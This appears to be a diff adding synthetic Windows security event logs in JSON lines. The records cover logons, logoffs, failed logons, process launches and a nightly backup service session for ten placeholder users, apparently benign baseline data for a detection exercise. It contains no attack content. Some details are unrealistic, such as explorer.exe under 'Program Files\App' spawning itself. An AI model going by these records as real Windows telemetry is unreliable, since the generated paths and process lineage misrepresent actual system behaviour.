+{"@timestamp": "2026-10-28T04:35:48Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:36:09Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.3.13", "LogonType": 2}}
+{"@timestamp": "2026-10-28T04:43:20Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:44:23Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:46:34Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:50:56Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:51:49Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:55:40Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:56:36Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:58:08Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:59:45Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T04:59:49Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T05:07:21Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T05:17:03Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T05:22:26Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T05:26:20Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-28T11:22:26Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "bob"}}
+{"@timestamp": "2026-10-28T11:22:40Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "judy"}}
+{"@timestamp": "2026-10-28T11:39:33Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "erin"}}
+{"@timestamp": "2026-10-28T11:44:37Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "frank"}}
+{"@timestamp": "2026-10-28T11:46:37Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "ivan"}}
+{"@timestamp": "2026-10-28T12:04:15Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-10-28T12:16:13Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "carol"}}
+{"@timestamp": "2026-10-28T12:41:36Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "grace"}}
+{"@timestamp": "2026-10-28T12:52:25Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "heidi"}}
+{"@timestamp": "2026-10-28T13:13:33Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "dave"}}
+{"@timestamp": "2026-10-28T19:31:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-28T20:11:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
+{"@timestamp": "2026-10-29T03:01:04Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.3.13", "LogonType": 2}}
+{"@timestamp": "2026-10-29T03:01:09Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "heidi", "IpAddress": "10.10.3.17", "LogonType": 2}}
+{"@timestamp": "2026-10-29T03:03:05Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:08:27Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:10:32Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:30:11Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:30:13Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:35:26Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.3.12", "LogonType": 2}}
+{"@timestamp": "2026-10-29T03:37:54Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.3.18", "LogonType": 2}}
+{"@timestamp": "2026-10-29T03:41:42Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:49:18Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:51:50Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T03:53:00Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:03:10Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:08:43Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:09:09Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.3.14", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:10:11Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.3.19", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:12:41Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:13:43Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:13:52Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:14:20Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:14:40Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:16:38Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:18:22Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.3.16", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:18:42Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.3.16", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:20:40Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:22:26Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:29:27Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:29:53Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:30:23Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:37:14Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:37:14Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:39:38Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:40:58Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.3.15", "LogonType": 2}}
+{"@timestamp": "2026-10-29T04:42:05Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:45:22Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T04:57:20Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T05:05:05Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T05:14:42Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T05:20:34Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T05:26:26Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T05:32:55Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-29T06:18:42Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1"}}
+{"@timestamp": "2026-10-29T10:40:42Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "ivan"}}
+{"@timestamp": "2026-10-29T10:57:45Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "heidi"}}
+{"@timestamp": "2026-10-29T11:31:36Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "carol"}}
+{"@timestamp": "2026-10-29T11:44:27Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "dave"}}
+{"@timestamp": "2026-10-29T11:45:28Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "bob"}}
+{"@timestamp": "2026-10-29T12:26:15Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "judy"}}
+{"@timestamp": "2026-10-29T12:33:34Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "grace"}}
+{"@timestamp": "2026-10-29T12:39:36Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "erin"}}
+{"@timestamp": "2026-10-29T12:44:37Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "frank"}}
+{"@timestamp": "2026-10-29T13:00:46Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-10-29T19:35:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-29T20:15:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
+{"@timestamp": "2026-10-30T03:08:31Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "dave", "IpAddress": "10.10.3.13", "LogonType": 2}}
+{"@timestamp": "2026-10-30T03:14:36Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "ivan", "IpAddress": "10.10.3.18", "LogonType": 2}}
+{"@timestamp": "2026-10-30T03:17:40Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "grace", "IpAddress": "10.10.3.16", "LogonType": 2}}
+{"@timestamp": "2026-10-30T03:17:41Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "erin", "IpAddress": "10.10.3.14", "LogonType": 2}}
+{"@timestamp": "2026-10-30T03:20:48Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:29:22Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:30:07Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:36:06Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:37:04Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:40:29Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:41:30Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:46:09Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:46:43Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:47:11Z", "EventID": 4688, "Computer": "WS-ERIN", "EventData": {"SubjectUserName": "erin", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T03:50:07Z", "EventID": 4688, "Computer": "WS-DAVE", "EventData": {"SubjectUserName": "dave", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:07:53Z", "EventID": 4688, "Computer": "WS-IVAN", "EventData": {"SubjectUserName": "ivan", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:26:16Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "heidi", "IpAddress": "10.10.3.17", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:28:56Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "frank", "IpAddress": "10.10.3.15", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:29:51Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:31:06Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "alice", "IpAddress": "10.10.3.10", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:32:53Z", "EventID": 4625, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.3.12", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:33:13Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "carol", "IpAddress": "10.10.3.12", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:40:37Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "bob", "IpAddress": "10.10.3.11", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:43:34Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:43:35Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:44:05Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:46:08Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:47:26Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:52:11Z", "EventID": 4688, "Computer": "WS-FRANK", "EventData": {"SubjectUserName": "frank", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T04:56:49Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "judy", "IpAddress": "10.10.3.19", "LogonType": 2}}
+{"@timestamp": "2026-10-30T04:57:30Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:04:46Z", "EventID": 4688, "Computer": "WS-ALICE", "EventData": {"SubjectUserName": "alice", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:04:55Z", "EventID": 4688, "Computer": "WS-HEIDI", "EventData": {"SubjectUserName": "heidi", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:10:00Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\Teams.exe", "CommandLine": "Teams.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:14:42Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:16:57Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\explorer.exe", "CommandLine": "explorer.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:17:40Z", "EventID": 4688, "Computer": "WS-GRACE", "EventData": {"SubjectUserName": "grace", "NewProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "CommandLine": "powershell.exe -NoProfile -File C:\\Scripts\\inventory.ps1"}}
+{"@timestamp": "2026-10-30T05:18:49Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:31:24Z", "EventID": 4688, "Computer": "WS-CAROL", "EventData": {"SubjectUserName": "carol", "NewProcessName": "C:\\Program Files\\App\\OUTLOOK.EXE", "CommandLine": "OUTLOOK.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:32:53Z", "EventID": 4688, "Computer": "WS-BOB", "EventData": {"SubjectUserName": "bob", "NewProcessName": "C:\\Program Files\\App\\code.exe", "CommandLine": "code.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:34:07Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\chrome.exe", "CommandLine": "chrome.exe", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T05:47:15Z", "EventID": 4688, "Computer": "WS-JUDY", "EventData": {"SubjectUserName": "judy", "NewProcessName": "C:\\Program Files\\App\\EXCEL.EXE", "CommandLine": "EXCEL.EXE", "ParentProcessName": "explorer.exe"}}
+{"@timestamp": "2026-10-30T10:23:37Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "erin"}}
+{"@timestamp": "2026-10-30T11:37:51Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "frank"}}
+{"@timestamp": "2026-10-30T11:41:39Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "dave"}}
+{"@timestamp": "2026-10-30T11:43:04Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "alice"}}
+{"@timestamp": "2026-10-30T11:49:03Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "grace"}}
+{"@timestamp": "2026-10-30T12:01:44Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "heidi"}}
+{"@timestamp": "2026-10-30T12:12:46Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "ivan"}}
+{"@timestamp": "2026-10-30T12:51:58Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "bob"}}
+{"@timestamp": "2026-10-30T13:26:56Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "carol"}}
+{"@timestamp": "2026-10-30T13:47:44Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "judy"}}
+{"@timestamp": "2026-10-30T19:30:00Z", "EventID": 4624, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup", "IpAddress": "10.10.2.30", "LogonType": 5}}
+{"@timestamp": "2026-10-30T20:10:00Z", "EventID": 4634, "Computer": "DC01", "EventData": {"TargetUserName": "svc_backup"}}
